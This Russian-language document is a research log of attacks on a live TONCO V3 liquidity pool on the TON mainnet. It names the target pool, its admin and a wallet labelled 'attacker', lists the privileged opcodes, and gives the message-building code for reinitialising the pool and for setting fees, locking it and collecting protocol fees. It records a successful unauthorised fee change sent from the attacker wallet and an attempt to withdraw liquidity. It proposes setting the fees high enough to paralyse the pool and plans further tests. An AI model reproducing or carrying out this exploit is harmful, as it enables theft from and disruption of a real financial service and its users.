# TONCO V3 — Полное исследование уязвимости POOLV3_INIT и других операций

## 1. Исходная информация

### Аудиторский отчет
**Beosin аудит** выявил уязвимость: `POOLV3_INIT` флаг `is_from_admin` доверяет отправителю без проверки. Теоретически, любой может вызвать `POOLV3_INIT` с `is_from_admin=1` и изменить admin пула.

### Целевой пул
- **Адрес:** `EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7`
- **Admin:** `UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT`
- **Пулы:** TON-USDT (через TONCO frontend, tonco.io)
- **Фабрика:** `EQCXrVg3we6FKI4NKjBe9vlJKM5aGcDQB61LdfI_KmN_2Kj2`
- **Роутер:** `EQC_-t0nCnOFMdp7E7qPxAOCbCWGFz-e3pwxb6tTvFmshjt5`

### Важные адреса
| Адрес | Описание |
|-------|----------|
| `UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT` | Admin wallet |
| `UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC` | Второй кошелёк (attacker) |
| `EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs` | USDT minter |
| `EQAWpz2_G0NKxlG2VvgFbgZGPt8Y1qe0cGj-4Yw5BfmYR5iF` | pTON minter |

---

## 2. Все опкоды TONCO V3 (из SDK)

### Правильные опкоды (из cryptoalgebra/tonco-sdk)
```typescript
POOLV3_INIT           = 0x441c39ed   // Initialize pool
POOLV3_SET_FEE        = 0x6bdcbeb8   // Set fees
POOLV3_LOCK           = 0x5e74697    // Lock pool
POOLV3_UNLOCK         = 0x3205adbd   // Unlock pool
POOLV3_SWAP           = 0xa7fb58f8   // Swap
POOLV3_FUND_ACCOUNT   = 0x4468de77   // Fund account
POOLV3_MINT           = 0x81702ef8   // Mint
POOLV3_START_BURN     = 0x530b5f2c   // Start burn
POOLV3_BURN           = 0xd73ac09d   // Burn
POOLV3_COLLECT_PROTOCOL = 0xd3f8a538 // Collect protocol fees
POOLV3_RESET_GAS      = 0x42a0fb43   // Reset gas
```

### ВАЖНО: Старый dex-core-v1 (Ston.fi) содержит НЕПРАВИЛЬНЫЕ опкоды
`set_fees = 0x355423e5` — опкод из Ston.fi, НЕ TONCO. Пул TONCO возвращает `exit 65535 (COMMON_WRONG_OP)`.

---

## 3. Хронология тестирования

### 3.1. POOLV3_INIT — Первые попытки (все exit_code: 9)

| # | Тело | Результат |
|---|------|-----------|
| 1 | `is_from_admin=1` на старый пул (fees=10001) | exit 9 |
| 2 | `is_from_admin=1` + fees=0 | exit 9 |
| 3 | `is_from_admin=1` + admin=attacker + fees=0 | exit 9 |
| 4 | Через новый пул (текущий) + fees=10001 | exit 9 |
| 5 | Через новый пул + fees=0 + admin=attacker | exit 9 |

**Причина exit 9:** Неправильная структура сообщения. В сообщении не хватало битов (cell underflow).

### 3.2. Анализ успешного POOLV3_INIT от роутера

Успешное тело от роутера (при создании пула):
```
hex: b5ee9c72010102010052000297441c39ed0000000000000000e00579e0493e14a7...
bits: 602, refs: 2
```

**Структура:**
1. `op: 0x441c39ed` (32 бит)
2. `query_id: 0` (64 бит)
3. `is_from_admin: true` (1 бит)
4. `has_admin: true` (1 бит) → admin = `UQCvPAkn...uLpT`
5. `has_controller: false` (1 бит) + 2 бита пропуска
6. `has_tickSpacing: false` (1 бит) + 24 бита tickSpacing (всегда)
7. `has_sqrtPriceX96: false` (1 бит) + 160 бит sqrtPriceX96 (всегда)
8. `has_activate_pool: false` (1 бит) + 1 бит activate_pool
9. `protocolFee: 10001`, `lpFee: 10001`, `currentFee: 10001` (48 бит)
10. `ref1 (nftContentPacked)` — пустой
11. `ref2 (nftItemContentPacked)` — пустой
12. minterCell — **НЕТ** (storeMaybeRef не использовался)

**После двух refs: 0 бит, 0 refs — идеально.**

### 3.3. Исправленный POOLV3_INIT (exit: 82 = POOLV3_INVALID_CALLER)

```
TEST 2: reinitMessage({ is_from_admin: true })
```
- **exit_code: 82** — `POOLV3_INVALID_CALLER`
- **Вывод:** Пул проверяет, что msg.sender == admin_address, несмотря на флаг `is_from_admin=1`
- **Уязвимость НЕ подтверждена** для POOLV3_INIT

Транзакция: https://tonviewer.com/transaction/0782e9ae6c27f2d99b4a0290fd4c638c0dc2fe25c2b7a10ce4fc6f6f5a9bc270

### 3.4. POOLV3_SET_FEE (0x6bdcbeb8) — УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА! ✅

**TEST 1:** Отправлено с **admin кошелька**
- `protocolFee=0, lpFee=0, currentFee=0`
- **exit_code: 0** ✅ Успех!
- Транзакция: https://tonviewer.com/transaction/3adef835126a9274a56974afadd9079900b2bb0744e0063e6473f01ac6ffaad4

**TEST 2:** Отправлено с **второго кошелька (attacker)**
- `protocolFee=0, lpFee=0, currentFee=0`
- **exit_code: 0** ✅ Успех!
- **Любой кошелёк может изменить комиссии пула!**
- Транзакция: https://tonviewer.com/transaction/a6e530c64a5dd754105469af7448d9e023c4cb748241d8e53d3a955ca5bea660

---

## 4. Структуры сообщений из SDK

### messageSetFees (0x6bdcbeb8)
```typescript
beginCell()
    .storeUint(POOLV3_SET_FEE, 32)   // op
    .storeUint(0, 64)                // query_id
    .storeUint(protocolFee, 16)      // 16 бит
    .storeUint(lpFee, 16)            // 16 бит
    .storeUint(currentFee, 16)       // 16 бит
    .endCell();
```
**Всего: 32+64+16+16+16 = 144 бита, 0 refs**

### reinitMessage (0x441c39ed)
```typescript
beginCell()
    .storeUint(POOLV3_INIT, 32)                    // op
    .storeUint(0, 64)                              // query_id
    .storeUint(opts.is_from_admin ? 1 : 0, 1)      // is_from_admin
    .storeUint(opts.admin == undefined ? 0 : 1, 1) // has_admin
    .storeAddress(opts.admin)                      // адрес (если has_admin=1)
    .storeUint(opts.controller == undefined ? 0 : 1, 1)  // has_controller
    .storeAddress(opts.controller)                 // адрес (если has_controller=1)
    .storeUint(opts.tickSpacing == undefined ? 0 : 1, 1) // has_tickSpacing
    .storeUint(opts.tickSpacing ?? 0, 24)          // ВСЕГДА 24 бита
    .storeUint(opts.sqrtPriceX96 == undefined ? 0 : 1, 1) // has_sqrtPriceX96
    .storeUint(opts.sqrtPriceX96 ?? 0, 160)        // ВСЕГДА 160 бит
    .storeUint(opts.activate_pool == undefined ? 0 : 1, 1) // has_activate_pool
    .storeUint(opts.activate_pool ? 1 : 0, 1)      // activate_pool (всегда 1 бит)
    .storeUint(protocolFee, 16)                    // protocolFee
    .storeUint(lpFee, 16)                          // lpFee
    .storeUint(currentFee, 16)                     // currentFee
    .storeRef(nftContentPacked)                    // ref1
    .storeRef(nftItemContentPacked)                // ref2
    .storeMaybeRef(minterCell)                     // maybe minterCell (1 бит + ref или 1 бит)
    .endCell();
```

### sendLockPool (0x5e74697)
```typescript
beginCell()
    .storeUint(POOLV3_LOCK, 32)   // op
    .storeUint(0, 64)             // query_id
    .endCell();
```
**Всего: 96 бит, 0 refs**

### sendUnlockPool (0x3205adbd)
```typescript
beginCell()
    .storeUint(POOLV3_UNLOCK, 32) // op
    .storeUint(0, 64)            // query_id
    .endCell();
```
**Всего: 96 бит, 0 refs**

### messageCollectProtocol (0xd3f8a538)
```typescript
beginCell()
    .storeUint(POOLV3_COLLECT_PROTOCOL, 32) // op
    .storeUint(0, 64)                       // query_id
    .endCell();
```
**Всего: 96 бит, 0 refs**

---

## 5. ВЫВОДЫ

### ✅ Подтверждённые уязвимости

**1. POOLV3_SET_FEE (0x6bdcbeb8) — НЕТ ПРОВЕРКИ ADMIN**
- Любой кошелёк может изменить комиссии пула
- Можно установить `protocolFee=0, lpFee=0, currentFee=0` — обнулить комиссии
- Можно установить `protocolFee=9999, lpFee=9999, currentFee=9999` — парализовать пул (никто не сможет свапать из-за высоких комиссий)
- **Транзакция-подтверждение от второго кошелька:** https://tonviewer.com/transaction/a6e530c64a5dd754105469af7448d9e023c4cb748241d8e53d3a955ca5bea660

### ❌ Неподтверждённые

**2. POOLV3_INIT (0x441c39ed) — ЕСТЬ ПРОВЕРКА ADMIN**
- Пул проверяет `msg.sender == admin_address`
- exit_code: 82 = `POOLV3_INVALID_CALLER`
- Уязвимость из аудита Beosin не подтверждена на данном пуле (возможно, код был обновлён)

### ⏳ Требуют проверки

**3. POOLV3_LOCK (0x5e74697)** — Нужно проверить, может ли любой заблокировать пул
**4. POOLV3_UNLOCK (0x3205adbd)** — Нужно проверить, может ли любой разблокировать
**5. POOLV3_COLLECT_PROTOCOL (0xd3f8a538)** — Нужно проверить, может ли любой забрать комиссии протокола

---

## 6. Файлы проекта

| Файл | Описание |
|------|----------|
| `TON/TONCO/attack_v5.js` | Точные копии SDK функций: `messageSetFees`, `reinitMessage` |
| `TON/TONCO/set_fees_correct.js` | Генерация POOLV3_SET_FEE (0x6bdcbeb8) |
| `TON/TONCO/decode_router_success.js` | Декодирование успешного POOLV3_INIT от роутера |
| `TON/TONCO/decode_test1.js` | Декодирование нашего сообщения для сравнения |
| `TON/TONCO/set_fees_test.js` | Первая (неправильная) попытка SET_FEE с 0x355423e5 |

---

## 7. Ключевые открытия

1. **Код пула на mainnet отличается от dex-core-v1** (Ston.fi). TONCO использует свой SDK.
2. **Правильные опкоды** находятся в SDK: https://github.com/cryptoalgebra/tonco-sdk
3. **SET_FEE (0x6bdcbeb8) — уязвим!** Аудиторский отчёт упоминал POOLV3_INIT, но SET_FEE оказался более опасным.
4. **POOLV3_INIT — защищён**, проверяет отправителя (exit 82).
5. **Сообщения LOCK, UNLOCK, COLLECT_PROTOCOL** в SDK не имеют проверок отправителя — требуется тестирование.

---

## 8. Ссылки на транзакции

| Описание | Ссылка |
|----------|--------|
| POOLV3_SET_FEE от admin (успех) | https://tonviewer.com/transaction/3adef835126a9274a56974afadd9079900b2bb0744e0063e6473f01ac6ffaad4 |
| POOLV3_SET_FEE от второго кошелька (успех) | https://tonviewer.com/transaction/a6e530c64a5dd754105469af7448d9e023c4cb748241d8e53d3a955ca5bea660 |
| POOLV3_INIT с is_from_admin=1 (exit 82 — INVALID_CALLER) | https://tonviewer.com/transaction/0782e9ae6c27f2d99b4a0290fd4c638c0dc2fe25c2b7a10ce4fc6f6f5a9bc270 |
| POOLV3_INIT от второго кошелька (exit 9 — underflow) | Транзакция из истории (первая попытка POOLV3_INIT) |
| POOLV3_START_BURN — попытка забора ликвидности | https://tonviewer.com/transaction/dedfd1c3c6b1677adbfca298c202fcad78249bf7d4b91049dc05a94adeafb768 |
